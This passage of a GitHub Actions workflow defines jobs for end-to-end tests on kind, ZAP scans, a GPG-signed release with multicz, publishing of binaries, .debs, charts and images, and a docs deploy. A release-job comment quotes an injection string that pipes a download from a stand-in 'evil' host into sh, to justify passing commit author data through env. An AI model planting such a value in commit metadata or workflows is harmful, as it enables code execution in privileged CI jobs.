          path: dist/infra-*.tgz
          retention-days: 1
      - name: Summary
        if: always()
        uses: ./.github/actions/summary
        with:
          title: chart-package
          body: Packaged the chart as artifact `infra-chart`.

  # ---------------------------------------------------------------------
  # End-to-end and DAST. Both bring the control plane up on kind through the
  # Helm chart, so they exercise what an operator installs rather than a
  # bespoke test rig. Each job builds its own cluster: a shared one would make
  # a ZAP failure and an e2e failure indistinguishable, and the runners are
  # parallel anyway.
  # ---------------------------------------------------------------------

  e2e:
    name: e2e
    needs: [detect, grype, chart-package]
    if: >-
      !cancelled() && !failure()
      && needs.detect.outputs.has_package_changes == 'true'
    runs-on: ubuntu-24.04
    permissions:
      contents: read
    steps:
      - uses: actions/checkout@v7
        with:
          fetch-depth: 0
      - uses: ./.github/actions/e2e-stack
      - name: Run the end-to-end suite
        run: test/e2e/smoke.sh
      # e2e-stack dumps on its own failure; this covers a failure of the suite
      # itself, which runs after the stack is up.
      - name: Dump cluster state on failure
        if: failure()
        run: |
          kubectl -n infra get pods -o wide || true
          kubectl -n infra logs -l app.kubernetes.io/part-of=infra \
            --tail=200 --all-containers || true
      - name: Summary
        if: always()
        uses: ./.github/actions/summary
        with:
          title: e2e
          body: |
            `charts/infra` deployed to kind against PostgreSQL, then
            `test/e2e/smoke.sh` over the API, identity provider, exporter and
            dashboard.

  owasp:
    name: owasp (${{ matrix.name }})
    needs: [detect, e2e]
    # has_package_changes is repeated from `e2e` on purpose: a skipped `needs`
    # does not skip the dependent job under `!cancelled() && !failure()`, so
    # without this a docs-only push would build two kind clusters to scan a
    # control plane nothing had changed.
    if: >-
      !cancelled() && !failure()
      && needs.detect.outputs.has_package_changes == 'true'
    runs-on: ubuntu-24.04
    permissions:
      contents: read
    strategy:
      fail-fast: false
      matrix:
        include:
          - name: api
            port: 8080
          - name: www
            port: 8088
    steps:
      - uses: actions/checkout@v7
        with:
          fetch-depth: 0
      - uses: ./.github/actions/e2e-stack
      - uses: ./.github/actions/owasp-scan
        with:
          target: http://127.0.0.1:${{ matrix.port }}
          name: ${{ matrix.name }}
      - name: Summary
        if: always()
        uses: ./.github/actions/summary
        with:
          title: owasp (${{ matrix.name }})
          body: |
            ZAP baseline against `${{ matrix.name }}` on port
            `${{ matrix.port }}`, gated by `.zap/rules.tsv`. Full report in
            artifact `zap-${{ matrix.name }}`.

  # Release on main only. multicz bumps cmd/<dir>/version.go, writes
  # changelogs, creates the release commit and per-component tags, and pushes
  # back to main. Artifact distribution is handled by the `publish` job.
  release:
    name: release
    needs:
      - detect
      - license-headers
      - lint
      - www
      - vet-build
      - test
      - gosec
      - govulncheck
      - osv-scanner
      - integration
      - hadolint
      - grype
      - deb-validate
      - chart-package
      - e2e
      - owasp
    # www is gated on www_changed, so it is skipped on non-frontend pushes. A
    # skipped need would skip release too, so tolerate skips (!cancelled) and
    # only block on real failures (!failure) rather than requiring success.
    if: >-
      !cancelled()
      && !failure()
      && github.event_name == 'push'
      && github.ref == 'refs/heads/main'
      && needs.detect.outputs.has_package_changes == 'true'
    runs-on: ubuntu-24.04
    permissions:
      contents: write
    outputs:
      no_bumps: ${{ steps.bump.outputs.no_bumps }}
      bumped: ${{ steps.bump.outputs.bumped }}
      bumped_json: ${{ steps.bump.outputs.bumped_json }}
    steps:
      # `main-protection` (the repo ruleset) requires every change to main to
      # go through a pull request; the default GITHUB_TOKEN authenticates as
      # github-actions[bot], which has no bypass for it. RELEASE_PAT is the
      # maintainer's own PAT, the same identity auto-merge-signed.yml already
      # uses to push signed commits straight to main, and it does bypass the
      # ruleset.
      - uses: actions/checkout@v7
        with:
          fetch-depth: 0
          persist-credentials: true
          token: ${{ secrets.RELEASE_PAT || secrets.GITHUB_TOKEN }}
      - uses: actions/setup-go@v7
        with:
          go-version-file: go.mod
          cache: true
      - uses: astral-sh/setup-uv@c18668ad3cf93ea998bef934396af7bb5c839dc7 # v10.2.0
        with:
          enable-cache: false
          python-version: "3.12"
      - name: Install multicz
        run: uv tool install multicz
      # The author name and email arrive through `env:`, never interpolated
      # into the script body. `${{ }}` is substituted before bash sees the
      # line, so a commit authored as `x"; curl evil|sh; #` would execute in a
      # job holding contents:write and the GPG key. Anyone able to land a
      # commit on main controls this string.
      - name: Configure git author
        env:
          AUTHOR_NAME: ${{ github.event.head_commit.author.name }}
          AUTHOR_EMAIL: ${{ github.event.head_commit.author.email }}
        run: |
          git config user.name  "${AUTHOR_NAME:-github-actions[bot]}"
          git config user.email "${AUTHOR_EMAIL:-41898282+github-actions[bot]@users.noreply.github.com}"
      - name: Detect GPG availability
        id: gpg
        env:
          GPG_PRIVATE_KEY: ${{ secrets.GPG_PRIVATE_KEY }}
          GPG_PASSPHRASE: ${{ secrets.GPG_PASSPHRASE }}
        run: |
          if [ -n "$GPG_PRIVATE_KEY" ] && [ -n "$GPG_PASSPHRASE" ]; then
            echo "available=true" >> "$GITHUB_OUTPUT"
          else
            echo "available=false" >> "$GITHUB_OUTPUT"
          fi
      - name: Import and unlock GPG key
        if: steps.gpg.outputs.available == 'true'
        env:
          GPG_PRIVATE_KEY: ${{ secrets.GPG_PRIVATE_KEY }}
          GPG_PASSPHRASE: ${{ secrets.GPG_PASSPHRASE }}
        run: |
          echo "$GPG_PRIVATE_KEY" | gpg --batch --import
          echo test | gpg --batch --yes --passphrase "$GPG_PASSPHRASE" \
            --pinentry-mode loopback --sign > /dev/null
          KEY_ID=$(gpg --list-secret-keys --with-colons \
            | awk -F: '/^sec/{print $5; exit}')
          git config user.signingkey "$KEY_ID"
      # Gate the bump on a non-empty plan. Without this the bump step runs on
      # every main push and has to be treated as "succeeded with no output",
      # which hides real failures behind the same empty-output signature.
      - name: Plan release
        id: plan
        run: |
          set -euo pipefail
          multicz plan \
            --summary "$GITHUB_STEP_SUMMARY" --output json > /tmp/plan.json
          if [ "$(jq '.bumps | length' /tmp/plan.json)" = "0" ]; then
            echo "release=false" >> "$GITHUB_OUTPUT"
            echo "no bumps pending"
          else
            echo "release=true" >> "$GITHUB_OUTPUT"
          fi
      - name: Bump, commit, tag, push
        id: bump
        if: steps.plan.outputs.release == 'true'
        run: |
          set -euo pipefail
          args=(bump --commit --tag --push
                --summary "$GITHUB_STEP_SUMMARY" --output json)
          # --sign covers both the release commit and the tags. Omitted rather
          # than passed false when no key is configured: the flag never
          # disables signing, so there is no negative form to pass.
          if [ "${{ steps.gpg.outputs.available }}" = "true" ]; then
            args+=(--sign)
          fi
          multicz "${args[@]}" | tee /tmp/bump.raw
          # multicz interleaves `post_bump: go mod tidy` progress lines on
          # stdout BEFORE the final JSON object, so the raw output is not
          # parseable as-is. Drop everything preceding the document's opening
          # brace, then assert the remainder really is JSON - an empty
          # `bumped` reads exactly like "nothing to release" downstream and
          # would silently skip publish + docs.
          sed -n '/^{/,$p' /tmp/bump.raw > /tmp/bump.json
          jq -e . /tmp/bump.json > /dev/null
          BUMPED=$(jq -r '.bumps | keys | join(" ")' /tmp/bump.json)
          BUMPED_JSON=$(jq -c '.bumps | keys' /tmp/bump.json)
          echo "bumped=$BUMPED" >> "$GITHUB_OUTPUT"
          echo "bumped_json=$BUMPED_JSON" >> "$GITHUB_OUTPUT"
          if [ -z "$BUMPED" ]; then
            echo "no_bumps=true" >> "$GITHUB_OUTPUT"
          else
            echo "no_bumps=false" >> "$GITHUB_OUTPUT"
          fi
      - name: Summary
        if: always()
        uses: ./.github/actions/summary
        with:
          title: release
          body: |
            Bumped: `${{ steps.bump.outputs.bumped || 'none' }}`. GPG signing:
            `${{ steps.gpg.outputs.available }}`. `multicz plan` and
            `multicz bump` append their own detail above.

  # Build and publish the bumped components: cross-compiled binaries attached
  # to a per-component GitHub Release. Matrix over each bumped component so one
  # failure does not abort the others. .deb packaging and Docker images are
  # added in later milestones (see PLAN.md).
  publish:
    name: publish (${{ matrix.component }})
    needs: [detect, release]
    if: >-
      github.event_name == 'push'
      && github.ref == 'refs/heads/main'
      && needs.release.result == 'success'
      && needs.release.outputs.no_bumps == 'false'
    runs-on: ubuntu-24.04
    strategy:
      fail-fast: false
      matrix:
        component: ${{ fromJson(needs.release.outputs.bumped_json) }}
    permissions:
      contents: write
      packages: write # push to GHCR
      id-token: write # cosign keyless signing via Sigstore
      actions: write # delete the consumed CI artifacts
    steps:
      - uses: actions/checkout@v7
        with:
          ref: main
      # No build cache on the publish path. The Go and npm caches are written
      # by pull-request runs, so restoring one here would let a pull request
      # place bytes into a job that signs and pushes release artifacts. Publish
      # compiles from a clean checkout; the minutes are the price of that.
      - uses: actions/setup-go@v7
        with:
          go-version-file: go.mod
          cache: false
      - uses: actions/setup-node@v7
        with:
          node-version: 22
      - uses: astral-sh/setup-uv@c18668ad3cf93ea998bef934396af7bb5c839dc7 # v10.2.0
        with:
          enable-cache: false
          python-version: "3.12"
      - name: Install multicz
        run: uv tool install multicz
      # The chart is a component like any other, so it arrives through the same
      # matrix - but it has no Go binary and no .deb, so it takes its own path
      # and every step below is guarded against it.
      - uses: actions/download-artifact@v8
        if: matrix.component == 'infra-chart'
        with:
          name: infra-chart
          path: dist
      - uses: azure/setup-helm@9bc31f4ebc9c6b171d7bfbaa5d006ae7abdb4310 # v5.0.1
        if: matrix.component == 'infra-chart'
        with:
          version: v3.19.0
      - name: Push the chart to GHCR and cut its release
        if: matrix.component == 'infra-chart'
        env:
          GH_TOKEN: ${{ github.token }}
          REGISTRY_TOKEN: ${{ github.token }}
          ACTOR: ${{ github.actor }}
          OWNER: ${{ github.repository_owner }}
        run: |
          set -euo pipefail
          version=$(multicz get infra-chart)
          tag="infra-chart-v${version}"
          owner=$(printf '%s' "$OWNER" | tr '[:upper:]' '[:lower:]')
          # Publishing the artifact chart-package produced, not a repack: the
          # .tgz attached to the release is the one checkov cleared.
          printf '%s' "$REGISTRY_TOKEN" \
            | helm registry login ghcr.io -u "$ACTOR" --password-stdin
          helm push "dist/infra-${version}.tgz" "oci://ghcr.io/${owner}/charts"
          notes=$(multicz release-notes --tag "$tag" || echo "Release $tag")
          gh release create "$tag" --title "$tag" --notes "$notes" \
            "dist/infra-${version}.tgz"

      # Reuse the amd64 .deb the deb-validate chain already installed, started
      # and scored, instead of rebuilding it here. Rebuilding would publish a
      # package nothing had validated - identical in intent, unverified in
      # fact. A component bumped purely by cascade has no artifact (its own
      # paths did not change), so probe rather than assume.
      - id: has_deb
        name: Check for a validated .deb from this run
        if: matrix.component != 'infra-chart'
        env:
          GH_TOKEN: ${{ github.token }}
        run: |
          set -euo pipefail
          if gh api --paginate \
               "/repos/${{ github.repository }}/actions/runs/${{ github.run_id }}/artifacts?per_page=100" \
               --jq '.artifacts[].name' | grep -qx "${{ matrix.component }}-deb"; then
            echo "value=true" >> "$GITHUB_OUTPUT"
          else
            echo "value=false" >> "$GITHUB_OUTPUT"
            echo "no validated .deb for ${{ matrix.component }}; will build one"
          fi
      - uses: actions/download-artifact@v8
        if: steps.has_deb.outputs.value == 'true'
        with:
          name: ${{ matrix.component }}-deb
          path: dist
      - name: Build release binaries
        if: matrix.component != 'infra-chart'
        env:
          GH_TOKEN: ${{ github.token }}
          HAS_VALIDATED_DEB: ${{ steps.has_deb.outputs.value }}
        run: |
          set -euo pipefail
          component="${{ matrix.component }}"
          case "$component" in
            infra)                     dir=cli ;;
            terraform-provider-infra)  dir=provider ;;
            infra-*)                   dir="${component#infra-}" ;;
            *)                         echo "unknown component $component" >&2; exit 1 ;;
          esac
          # The web dashboard embeds the built SPA, so build the frontend first.
          if [ "$dir" = "www" ]; then
            ( cd www && npm ci && npm run build )
            find cmd/www/dist -mindepth 1 ! -name .gitkeep -delete
            cp -r www/dist/. cmd/www/dist/
          fi
          version=$(multicz get "$component")
          tag="${component}-v${version}"
          mkdir -p dist
          # infra-spa is the standalone SPA bundle (no Go binary): build it and
          # ship www/dist as a tarball release asset.
          if [ "$component" = "infra-spa" ]; then
            ( cd www && npm ci && npm run build )
            tar -czf "dist/infra-spa_${version}_dist.tar.gz" -C www/dist .
            ( cd dist && sha256sum infra-spa_${version}_* > "infra-spa_${version}_checksums.txt" )
            notes=$(multicz release-notes --tag "$tag" || echo "Release $tag")
            gh release create "$tag" --title "$tag" --notes "$notes" dist/infra-spa_${version}_*
            exit 0
          fi
          for platform in linux/amd64 linux/arm64; do
            os="${platform%/*}"; arch="${platform#*/}"
            out="dist/${component}_${version}_${os}_${arch}"
            CGO_ENABLED=0 GOOS="$os" GOARCH="$arch" \
              go build -ldflags='-s -w' -o "$out" "./cmd/${dir}/"
          done
          # Debian packages for the binary components. infra-www ships as a
          # container image instead.
          #
          # arm64 is always built here: deb-validate installs and starts the
          # package on an amd64 runner, so an arm64 .deb cannot go through
          # those gates and is published on the strength of the shared build
          # script alone. amd64 is only rebuilt when the validated artifact is
          # missing.
          if [ "$component" != "infra-www" ]; then
            ARCH=arm64 ./packaging/build-debs.sh "$version" "$component"
            if [ "$HAS_VALIDATED_DEB" = "true" ]; then
              echo "publishing the validated amd64 .deb from deb-validate"
              ls -l "dist/${component}_${version}_amd64.deb"
            else
              ARCH=amd64 ./packaging/build-debs.sh "$version" "$component"
            fi
          fi
          ( cd dist && sha256sum ${component}_${version}_* > "${component}_${version}_checksums.txt" )
          ls -l dist
          notes=$(multicz release-notes --tag "$tag" || echo "Release $tag")
          gh release create "$tag" \
            --title "$tag" \
            --notes "$notes" \
            dist/${component}_${version}_*
      # Only the five containerised components have an image artifact from
      # this run, and only when they actually changed. Probe instead of
      # branching on a hardcoded component list, which would drift the moment
      # the container matrix gains or loses an entry.
      - id: has_image
        name: Check for a container image from this run
        if: matrix.component != 'infra-chart'
        env:
          GH_TOKEN: ${{ github.token }}
        run: |
          set -euo pipefail
          if gh api --paginate \
               "/repos/${{ github.repository }}/actions/runs/${{ github.run_id }}/artifacts?per_page=100" \
               --jq '.artifacts[].name' | grep -qx "${{ matrix.component }}-image"; then
            echo "value=true" >> "$GITHUB_OUTPUT"
          else
            echo "value=false" >> "$GITHUB_OUTPUT"
            echo "${{ matrix.component }} ships no container image this run"
          fi
      - id: meta
        if: steps.has_image.outputs.value == 'true'
        run: |
          set -euo pipefail
          echo "version=$(multicz get '${{ matrix.component }}')" >> "$GITHUB_OUTPUT"
          # GHCR namespaces are lowercase; the org name already is, but a
          # rename to a mixed-case owner would otherwise fail the push here
          # rather than anywhere legible.
          echo "owner=$(printf '%s' '${{ github.repository_owner }}' \
            | tr '[:upper:]' '[:lower:]')" >> "$GITHUB_OUTPUT"
      - uses: ./.github/actions/publish-image
        if: steps.has_image.outputs.value == 'true'
        with:
          component: ${{ matrix.component }}
          version: ${{ steps.meta.outputs.version }}
          owner: ${{ steps.meta.outputs.owner }}
          token: ${{ github.token }}
      # The image and its SBOM are published and signed; keeping the run
      # artifacts would leave a second, unsigned copy of the same bits around
      # for anyone reading the run page to pick up by mistake.
      - name: Delete the consumed CI artifacts
        if: >-
          steps.has_image.outputs.value == 'true'
          || steps.has_deb.outputs.value == 'true'
        uses: geekyeggo/delete-artifact@176a747ab7e287e3ff4787bf8a148716375ca118 # v6.0.0
        with:
          name: |
            ${{ matrix.component }}-image
            ${{ matrix.component }}-sbom
            ${{ matrix.component }}-deb
          failOnError: false
      - name: Summary
        if: always()
        uses: ./.github/actions/summary
        with:
          title: publish (${{ matrix.component }})
          body: |
            Cross-compiled `linux/amd64` + `linux/arm64`, packaged the `.deb`s
            and cut the GitHub Release for `${{ matrix.component }}`. Published
            the validated amd64 `.deb`:
            `${{ steps.has_deb.outputs.value }}`. Container image pushed and
            cosign-signed: `${{ steps.has_image.outputs.value }}`.

  # Build the Zensical site and deploy to GitHub Pages. Runs on either signal
  # that can change the published output: a direct edit under docs/ or
  # zensical.toml (`docs_changed`), or a release bump (the site embeds
  # version + changelog content, so every bump invalidates the rendered
  # output even when no markdown changed). Gating on `release.result ==
  # 'success'` alone, as this job used to, missed the first case entirely: a
  # docs-only push has no package changes, so `release` is skipped rather
  # than successful, and the site never rebuilt even though docs/ changed.
  #
  # `needs` repeats the quality-gate list `release` depends on rather than
  # just depending on `release` itself, because a skipped `release` does not
  # say whether those gates passed or never ran - and `docs_changed` must
  # not bypass a real failure among them.
  docs:
    name: docs
    needs:
      - detect
      - license-headers
      - lint
      - www
      - vet-build
      - test
      - gosec
      - govulncheck
      - osv-scanner
      - integration
      - hadolint
      - grype
      - deb-validate
      - chart-package
      - e2e
      - owasp
      - release
    if: >-
      !cancelled()
      && !failure()
      && github.event_name == 'push'
      && github.ref == 'refs/heads/main'
      && (
        needs.detect.outputs.docs_changed == 'true'
        || (needs.release.result == 'success' && needs.release.outputs.no_bumps == 'false')
      )
    runs-on: ubuntu-24.04
    environment:
      name: github-pages
      url: ${{ steps.deployment.outputs.page_url }}
    permissions:
      contents: read
      pages: write
      id-token: write
    steps:
      - uses: actions/checkout@v7
        with:
          ref: main
      - uses: actions/configure-pages@v6
        with:
          enablement: true
      - uses: astral-sh/setup-uv@c18668ad3cf93ea998bef934396af7bb5c839dc7 # v10.2.0
        with:
          enable-cache: false
      - name: Build site
        run: uv tool run zensical build --clean
      - uses: actions/upload-pages-artifact@v5
        with:
          path: site
      - id: deployment
        uses: actions/deploy-pages@v5
      - name: Summary
        if: always()
        uses: ./.github/actions/summary
        with:
          title: docs
          body: |
            `zensical build --clean` deployed to GitHub Pages:
            ${{ steps.deployment.outputs.page_url }}
